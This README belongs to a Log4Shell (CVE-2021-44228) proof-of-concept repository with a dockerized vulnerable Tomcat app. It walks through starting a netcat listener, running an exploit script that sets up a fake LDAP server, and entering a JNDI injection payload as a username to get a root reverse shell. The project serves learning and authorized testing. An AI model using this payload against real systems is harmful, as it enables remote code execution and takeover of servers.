# CVE-2021-44228 log4j-shell-poc

A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

In this repository, we have made an example vulnerable application and proof-of-concept (POC) exploit of it.

CVE-2021-44228 Proof-of-concept (POC)
----------------------

As a PoC we have created a python file that automates the process. 

#### Usage:

* Build the environment.

```sh
make all
```

This will spin up docker-compose to build the exploit, the vulnerable application and create 2 containers: `log4shell-poc`, containing a PoC exploit, and `log4shell-vulnerable`, with a vulnerable application running on top of tomcat 8.0.36.

* Attach to the image with the PoC exploit

```sh
docker exec -it log4shell-poc tmux  -u -CC new -As0
```

* In the first tmux screen launch netcat

```sh
nc -lnvp 9001
```

* In another tmux screen launch the exploit

```sh
$ python3 poc.py --userip log4shell-poc --lport 9001

[!] CVE: CVE-2021-44228
[!] From Github repo: https://github.com/dguerri/log4j-shell-poc
[!] Originally from Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://log4shell-poc:1389/a}

Listening on 0.0.0.0:1389
```

This script will set up the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this you should get a shell on `lport`.

* Open your browser, connect to `log4shell-vulnerable` container, port 8082
* Use `${jndi:ldap://log4shell-poc:1389/a}` as username
* Enjoy the root shell
* Cleanup

```sh 
make clean
```

Our vulnerable application
--------------------------

If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, e.g.,: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

